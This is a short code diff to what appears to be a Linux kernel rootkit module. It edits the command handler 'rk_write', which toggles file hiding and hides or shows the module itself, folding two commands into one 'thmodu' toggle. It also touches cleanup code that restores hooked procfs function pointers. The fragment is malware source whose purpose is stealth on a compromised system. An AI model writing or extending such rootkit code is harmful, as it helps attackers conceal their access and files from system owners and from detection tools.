@@ -205,13 +205,12 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     {
         hide_files = !hide_files;
     }
-    else if(!strncmp(buffer, "nhmodu", MIN(6, count)))
+    else if(!strncmp(buffer, "thmodu", MIN(6, count)))
     {
-        module_hide();
-    }
-    else if(!strncmp(buffer, "uhmodu", MIN(6, count)))
-    {
-        module_show();
+        if(hide_module)
+            module_hide();
+        else
+            module_show();
     }
 
     return count;
@@ -294,7 +293,7 @@ static void procfs_clean(void)
         set_addr_rw(proc_fops);
         proc_fops->iterate = proc_iterate_orig;
         set_addr_ro(proc_fops);
-	}
+    }
 }
 
 static void fs_clean(void)
